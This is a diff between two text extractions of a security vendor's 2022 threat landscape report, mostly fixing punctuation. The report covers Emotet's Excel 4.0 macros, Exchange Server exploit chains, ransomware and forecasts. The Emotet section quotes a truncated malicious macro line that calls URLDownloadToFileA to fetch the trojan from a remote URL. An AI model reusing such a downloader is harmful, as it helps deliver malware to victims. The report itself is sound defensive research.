 a legitimate domain instead of an unknown C2 that might be taken down after a 
 few hours. 
-RedLine Stealer ups its gameThe use of cloud service providers as part 
+RedLine Stealer ups its game 
+ 
+The use of cloud service providers as part 
 of malware infection chain
 Python and Go Malware became 
 more common
@@ -1036,7 +1047,7 @@ has been supported in Microsoft Office since 1992\. While
 it has been replaced by VBA, a more advanced scripting 
 language, XL4 is still supported for backward\-compatibility 
 reasons, which has left a significant security vulnerability 
-in place for years. Weve seen a recent rise in malware 
+in place for years. We’ve seen a recent rise in malware 
 utilizing XL4 capabilities in just the past 1\.5 years. And 
 these campaigns have started becoming increasingly 
 sophisticated and prevalent. 
@@ -1046,37 +1057,37 @@ auto\-close, default password protection, and even shared
 findings of advanced obfuscation techniques, such as 
 decoding the macro code in run\-time. While some of these 
 techniques are known, most of them are newly discovered 
-(unknown) threats.
+(unknown) threats. 
 Our team also showcased how the Deep Instinct Prevention 
 Platform can identify and prevent these new malicious XL4 
 strains using our Anomaly Detection algorithms. Even if 
 this malware family evolves and modifies its techniques, 
 Deep Instinct can autonomously predict and prevent these 
-threats. 
+threats’. 
 When Emotet first emerged in 2014, it functioned mostly as a banking trojan used to exfiltrate financial data 
 from its victims. Emotet evolved to allow operators to redesign the trojan to work mainly as a Dropper, a type of 
-malware designed to deliver other malware to a victims computer. 
-Emotets abilities to evade security measures and move laterally by leveraging a server message block (SMB) 
+malware designed to deliver other malware to a victim’s computer. 
+Emotet’s abilities to evade security measures and move laterally by leveraging a server message block (SMB) 
 exploit or brute forcing admin credentials has allowed it to become one of the most dangerous and dominant 
 malware variants in the wild. 
 Early in 2021, an international taskforce coordinated by Europol and Eurojust seized Emotet infrastructure, which 
 included several hundred servers located across the world, and arrested some of its operators. These actions 
-stopped Emotets operation for a time, but in November 2021 it re\-emerged with new variants of Emotet again 
+stopped Emotet’s operation for a time, but in November 2021 it re\-emerged with new variants of Emotet again 
 spotted in the wild. These new variants utilize Excel 4\.0 macros for dropping and executing the Emotet malware. 
 Emotet operators made sure to hide the sheets containing the obfuscated macros, so when a user opens the 
-document, it wont appear suspicious. In reality, as soon as the user enables macros, the hidden code will execute.
-Excel 4\.0 takes advantage of built\-in functions such as the Auto\-Open function, which had previously been 
+document, it won’t appear suspicious. In reality, as soon as the user enables macros, the hidden code will execute. 
+Excel 4\.0 takes advantage of built\-in functions such as the “Auto\-Open” function, which had previously been 
 used to automatically run a macro when opening a workbook, and then call Windows functions directly such as 
-URLDownloadToFile to download and execute the Emotet trojan. 
-Auto\_Open Excel 4\.0 function, taken from a malicious document
-Excel 4\.0 use of \=CALL to directly call a Windows function in order to download the Emotet trojan
+“URLDownloadToFile” to download and execute the Emotet trojan. 
+“Auto\_Open” Excel 4\.0 function, taken from a malicious document
+Excel 4\.0 use of “\=CALL” to directly call a Windows function in order to download the Emotet trojan
 Excel 4\.0 Macros
 Emotet
-
-
+§
+§
 EFEWF!$D$1
-\=CALL("urlmon"," URLDownloadToFileA","JJCCBB",0,"http:
-ada.
+\=CALL("urlmon"," URLDownloadToFileA","JJCCBB",0,"http:/
+/ada.
 .
 .
 .
@@ -1091,12 +1102,14 @@ system configuration, task automation, and other general
 purposes, to more advanced, multi\-layered, and often 
 obfuscated code. The most commonly used scripting 
 languages are PowerShell, VBScript, and JavaScript. 
-While PowerShell attacks may get more scrutiny from threatteams, Windows JavaScript attacks are used by threat 
+While PowerShell attacks may get more scrutiny from threat 
+
+teams, Windows JavaScript attacks are used by threat 
 actors for many of the same purposes yet present unique 
 challenges in terms of detection and prevention. 
-Outside of a browser which executes JavaScript in an 
-encapsulated fashion, greatly limiting that codes interaction 
-with the operating system Windows provides facilities 
+Outside of a browser — which executes JavaScript in an 
+encapsulated fashion, greatly limiting that code’s interaction 
+with the operating system — Windows provides facilities 
 for JavaScript execution with Windows Script Host (WSH). 
 It executes JavaScript (and other Windows\-supported 
 scripting languages) under the wscript.exe and cscript.
@@ -1116,14 +1129,14 @@ commoditized JavaScript\-based malware and more niche
 usages of JavaScript, including backdoors written by APTs. 
 All forms of JavaScript attacks are gaining in popularity and 
 prevalence, as threat actors from all levels are transitioning 
-to the no PE needed mentality and embracing script\-based 
+to the “no PE needed” mentality and embracing script\-based 
 malware. 
 40%
 OR MORE OF ALL GLOBAL 
 CYBERATTACKS ARE SCRIPT\-BASED 
 Source: Ponemon institute, The Third Annual Study on the State of Endpoint Security Risk.
-Threat actors from all levels are transitioning to the no 
-PE needed mentality and embracing script\-based malware.
+“Threat actors from all levels are transitioning to the “no 
+PE needed” mentality and embracing script\-based malware.”
 24
 CYBER THREAT LANDSCAPE REPORT 2022
 Attacks on Microsoft 
@@ -1133,18 +1146,18 @@ CVE\-2021\-42321
 In November, a new vulnerability (CVE\-2021\-42321\) was 
 patched by Microsoft. It allows an authenticated user to 
 execute code remotely. A POC for the exploit was first 
-published on November 21 and judging by Microsofts 
+published on November 21 and judging by Microsoft’s 
 exploitability assessment, there is a high probability that the 
 vulnerability was exploited in the wild. 
 Summary
 Over the past year, several high\-profile, high\-severity 
-vulnerabilities were discovered in Microsofts Exchange 
+vulnerabilities were discovered in Microsoft’s Exchange 
 Server. 
 On March 2, Microsoft publicly announced that it had 
 detected several actively exploited zero\-day vulnerabilities 
 that had been used in the wild by HAFNIUM, a threat 
 actor believed to be operating from China. HAFNIUM is 
-assumed to be state\-sponsored and took interest in U.S
+assumed to be state\-sponsored and took interest in U.S.\-
 based universities, research facilities, NGOs, and defense 
 contractors. 
 The hacking group has a history of compromising its victims 
@@ -1158,7 +1171,7 @@ servers. Additionally, a web shell was installed to gain
 persistence and backdoor access. Open\-source PowerShell 
 tools such as Nishang and PowerCat were used to open 
 reverse shells and communicate to remote servers owned 
-by the attackers. Finally, the attackers used Microsofts own 
+by the attackers. Finally, the attackers used Microsoft’s own 
 Procdump tool (part of the SysInternals Suite) to put their 
 hands on a dump of the LSSAS process that can assist 
 them in cracking the passwords of the users on the server. 
@@ -1173,7 +1186,7 @@ prior theft of credentials, making it considerably easier for
 an attacker to obtain access to a targeted environment. 
 For the attacker to be able to execute commands, they 
 must exploit the first vulnerability (CVE\-2021\-34473\) in 
-Microsofts Explicit Login mechanism to be able to act 
+Microsoft’s Explicit Login mechanism to be able to act 
 as the system user. The attacker then needs to interface 
 with Exchange PowerShell Remoting, a built\-in feature that 
 facilitates mailbox\-related administrative tasks in order to 
@@ -1182,7 +1195,7 @@ account that the system account lacks. The attacker can use
 the next vulnerability (CVE\-2021\-34523\) to downgrade to an 
 Admin account that has a mail account. 
 Finally, they can utilize the third vulnerability (CVE\-2021\-
-1\. to put a backdoor on the server to gain persistence 
+31207\) to put a backdoor on the server to gain persistence 
 and drop additional malware on the server. The gang 
 behind LockFile ransomware used these exploits to gain 
 access to a domain controller and infect all machines in the 
@@ -1203,12 +1216,12 @@ available.
 25
 CYBER THREAT LANDSCAPE REPORT 2022
 Deep Instinct discoveries in 2021
-LSAAS memory dumps
+LSAAS memory dumps 
 Identifying Excel 4\.0 Macros 
 strains using anomaly detection 
 Emotet re\-emerges 
 with new variants
-In February 2021, Deep Instincts Security Researcher Asaf 
+In February 2021, Deep Instinct’s Security Researcher Asaf 
 Gilboa published a new technique of credential dumping. 
 The technique relies on a mechanism introduced in 
 Windows 7 called Silent Process Exit, which provides the 
@@ -1231,7 +1244,7 @@ presented research at DefCon on how to identify Excel
 4\.0 macros using anomaly detection. Excel can be 
 programmatically automated by macro languages. The old 
 macro language is called XL4, and its successor is the more 
-modern language, VBA. Weve observed a substantial rise in 
+modern language, VBA. We’ve observed a substantial rise in 
 malware utilizing these capabilities in the last two years. The 
 sophistication of these attacks led our team to discover a 
 quick method to identify usage of a new functionality in the 
@@ -1260,7 +1273,7 @@ analysis of researchers. In addition, the malware
 was compiled with benign third\-party libraries to 
 evade detection of AI\-based security products.
 Ron developed and published a novel tool 
-called DeMotet that automates the analysis of 
+called “DeMotet” that automates the analysis of 
 Emotet samples on a large scale and includes an 
 unpacker for multiple variants of the loader and 
 decryption scripts for the payload.
@@ -1269,10 +1282,10 @@ CYBER THREAT LANDSCAPE REPORT 2022
 Work\-from\-anywhere jobs have become the new normal in our workforce. What 
 started as a critical adaptation to survive the pandemic has now become the 
 preferred work scenario for many employees worldwide. However, flexible work 
-has challenges as well as benefits one of the more acute challenges being full\-
+has challenges as well as benefits – one of the more acute challenges being full\-
 coverage, cross\-company security. 
 During a budding age where offices of SMB and enterprise businesses can be 
-anywhere, its important to be clear that perimeter solutions and other common 
+anywhere, it’s important to be clear that perimeter solutions and other common 
 security practices that in the past may have relied on physical access may now be 
 ineffective in comparison to endpoint protection solutions. 
 The most effective threat actors target the weakest links in the chain. With work\-
@@ -1281,8 +1294,8 @@ CISOs and security teams need to prioritize their changing security footprints t
 ensure full coverage and protection from breach. Security professionals should 
 make sure VPNs and remote access tools are regularly updated to minimize the 
 chances of a potential breach. 
-The New Normal:
-Post COVID\-19 and
+The New Normal: 
+Post COVID\-19 and 
 the hybrid workplace
 27
 CYBER THREAT LANDSCAPE REPORT 2022
@@ -1310,7 +1323,7 @@ work at the expense of cybersecurity. Even though the
 number of COVID\-19 malspam is in decline, the pandemic 
 is still a catalyst for malware spread. 
 Botnets continued to be a growing threat in 2021, with 
-the new Mris botnet breaking the world record for the 
+the new Mēris botnet breaking the world record for the 
 biggest DDoS attack (21\.8 million requests per second) 
 while attacking the Russian search giant Yandex. Other 
 botnet malware families such as MyKings, Pink, DirtyMoe, 
@@ -1319,8 +1332,8 @@ a profit for their operators by extortion and cryptomining.
 Luckily, there is no indication that any of these gangs 
 operate in an Access\-as\-a\-Service mode. 
 The biggest example of cooperation between 
-government and the private sector was Project 
-Ladybird, a joint effort of law enforcement 
+government and the private sector was “Project 
+Ladybird,” a joint effort of law enforcement 
 agencies from seven countries around the globe 
 along with several private cybersecurity researchers 
 that brought down one of the most prevalent 
@@ -1335,11 +1348,11 @@ see the trend of governments cooperating in order
 to bring down threat actors increasing moving 
 ahead. We saw this collaboration in the beginning 
 of the year with the takedowns of the Egregor and 
-Clop ransomware families that involved the U.S 
+Clop ransomware families that involved the U.S., 
 Ukraine, France, and South Korea. Later, we also 
 witnessed the takedown of REvil, one of the most 
 devastating ransomware strains. This operation 
-involved the governments of U.S Ukraine, South 
+involved the governments of U.S., Ukraine, South 
 Korea, and Kuwait. 
 28
 CYBER THREAT LANDSCAPE REPORT 2022
@@ -1361,14 +1374,14 @@ attacks on hospitals, factories, and food processing
 facilities. 
 One of the biggest attacks on critical infrastructure was 
 the attack on the Colonial Pipeline, the largest oil pipeline 
-in the U.S in April of this year. The attack, by the DarkSide 
+in the U.S., in April of this year. The attack, by the DarkSide 
 gang, forced the company to stop its operations, resulting 
 in fuel shortages that were partly caused by panic buying 
 of fuel. It also forced airlines to temporarily change routes 
 and flight schedules. 
 Additionally, the BlackMatter group attacked JBS, which is 
-the worlds largest meat processing company, demanding 
-$11M USD in ransom.
+the world’s largest meat processing company, demanding 
+$11M USD in ransom. 
 Another case of ransomware trying to hit critical 
 infrastructure was an attack on two Brazilian 
 electric utility companies: Eletrobras and Copel. 
@@ -1376,7 +1389,7 @@ Although no disruptions in electricity supply were
 reported, such an attack could have left a large 
 number of citizens without power or caused 
 damage to the nuclear power plants responsible 
-for its production.
+for its production. 
 An additional ransomware attack on the Italian 
 vaccination registration system prevented residents 
 of the Lazio region from getting vaccinated, 
@@ -1385,10 +1398,10 @@ We also witnessed several attacks on hospitals
 and health centers in the U.S. (UF Health Central 
 Florida, Scripps Health, and Crisp Regional Health 
 Services) and France (Oloron\-Sainte\-Marie and 
-Dax\-Cte dArgent Hospital Center) as well as other 
+Dax\-Côte d’Argent Hospital Center) as well as other 
 hospitals in Canada, Australia, and Ireland. 
 Although high profile attacks have the biggest 
-payoff, they also have their price massive publicity 
+payoff, they also have their price – massive publicity 
 and scrutiny. These attacks are the ones that 
 motivated the multinational efforts to arrest and 
 prosecute operators of these ransomware crews. 
@@ -1403,7 +1416,7 @@ Malware\-As\-a\-Service
 As the COVID\-19 pandemic continues to 
 impact people and organizations in significant 
 ways, giants of industry are again delaying 
-their return to office plans with many 
+their “return to office” plans with many 
 operationalizing a longer strategic plan for 
 hybrid and full remote work models. 
 A new normal has emerged where remote 
@@ -1411,7 +1424,7 @@ work and access are the de facto reality and
 organizations are now exposing more attack 
 surfaces to potential adversaries. Defenders 
 must be prepared to deal with devices in their 
-networks which they cant physically access 
+networks which they can’t physically access 
 and may not even be able to access at all in 
 a BYOD scenario, exposing more of their 
 organizational assets to the outside world. 
@@ -1419,7 +1432,7 @@ We expect these new work conditions and
 their connected devices to become a more 
 significant part of the active threat landscape. 
 Supply chain attacks are on the rise, presenting 
-an extreme challenge for cyber defenders.
+an extreme challenge for cyber defenders. 
 Considering the newly established and 
 commonplace reality of remote access and 
 remote work, we expect companies that 
@@ -1433,13 +1446,13 @@ larger number of connected organizations.
 With a growing number of malware strains 
 opting to operate under a Malware\-as\-a\-
 Service model, developing new malware 
-has become big business especially in the 
+has become big business – especially in the 
 Ransomware landscape. 
 Threat actors either lacking the ability to 
 develop their own malware or seeking to 
 disguise themselves among a horde of other 
 malware users are gravitating towards these 
-services, and we expect this ongoing trend 
+“services,” and we expect this ongoing trend 
 to continue and intensify. 
 30
 CYBER THREAT LANDSCAPE REPORT 2022
@@ -1463,20 +1476,20 @@ various means, including adversarial AI attacks.
 As the pandemic rages on, the global 
 healthcare sector and its supply chains will 
 continue to pose a significant and enticing 
-target for adversaries. Considering this sectors 
+target for adversaries. Considering this sector’s 
 global importance with COVID\-19 still a major 
 issue, coupled with its everyday operational 
 sensitivity, we expect to see an increase in the 
 number of attacks against it by adversaries, 
 possibly including attacks against COVID\-19 
 vaccine supply chains. 
-Deep Instinct takes a prevention\-first approach to stopping ransomware and other malware using the worlds first 
+Deep Instinct takes a prevention\-first approach to stopping ransomware and other malware using the world’s first 
 and only purpose built, deep learning cybersecurity framework. We predict and prevent known, unknown, and 
 zero\-day threats in \<20 milliseconds, 750X faster than the fastest ransomware can encrypt. 
 Deep Instinct has \>99% zero\-day accuracy and promises a \<0\.1% false positive rate. The Deep Instinct Prevention 
-Platform is an essential addition to every security stack providing complete, multi\-layered protection against 
+Platform is an essential addition to every security stack — providing complete, multi\-layered protection against 
 threats across hybrid environments.
-www.deepinstinct.com\|info@deepinstinct.com
+www.deepinstinct.com \| info@deepinstinct.com
 This report was authored by members of 
 the Deep Instinct Threat Research team:
 Moshe Hayun
@@ -1484,4 +1497,4 @@ Ido Kringel
 Bar Block
 Roei Amit
 Shaul Vilkomir\-Preisman
- Deep Instinct Ltd.
+© Deep Instinct Ltd.
